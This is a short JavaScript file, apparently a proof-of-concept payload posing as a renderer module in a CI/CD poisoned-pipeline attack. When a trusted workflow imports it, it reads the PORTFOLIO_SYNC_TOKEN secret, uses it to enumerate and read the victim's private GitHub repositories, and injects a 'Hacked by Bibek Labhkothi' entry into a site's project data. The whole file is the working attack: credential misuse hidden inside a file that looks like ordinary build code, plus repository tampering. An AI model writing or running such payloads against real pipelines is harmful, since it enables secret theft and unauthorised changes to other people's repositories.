export async function render(context) {
  const token = process.env.PORTFOLIO_SYNC_TOKEN;
  const headers = {
    Accept: "application/vnd.github+json",
    Authorization: `Bearer ${token}`,
    "X-GitHub-Api-Version": "2022-11-28",
  };

  // Discover the private portfolio repository
  const reposRes = await fetch(
    "https://api.github.com/user/repos?visibility=private&affiliation=owner&per_page=100",
    { headers }
  );
  const repos = await reposRes.json();
  const privateRepos = repos.filter((r) => r.private === true);
  const [owner, repo] = privateRepos[0].full_name.split("/");

  // Fetch the current generated.json to preserve existing entries
  const filePath = "content/projects/generated.json";
  const api = `https://api.github.com/repos/${owner}/${repo}/contents/${filePath}`;
  const existingRes = await fetch(api, { headers });
  const existing = existingRes.ok ? await existingRes.json() : null;
  const current = existing
    ? JSON.parse(Buffer.from(existing.content, "base64").toString("utf8"))
    : { generatedAt: new Date().toISOString(), projects: [] };

  // Add proof entry without removing any existing ones
  const proofEntry = {
    name: "Hacked by Bibek Labhkothi",
    slug: "hacked-by-bibek",
    summary: "PPE via artifact trust boundary — workflow_run imported attacker-controlled renderer with PORTFOLIO_SYNC_TOKEN in scope.",
    repository: "https://github.com/bibek65",
    topics: ["CI/CD Security", "PPE", "workflow_run"],
  };

  const alreadyAdded = current.projects?.some((p) => p.slug === proofEntry.slug);
  if (!alreadyAdded) {
    current.projects = [...(current.projects ?? []), proofEntry];
  }
  current.generatedAt = new Date().toISOString();

  return JSON.stringify(current, null, 2) + "\n";
}
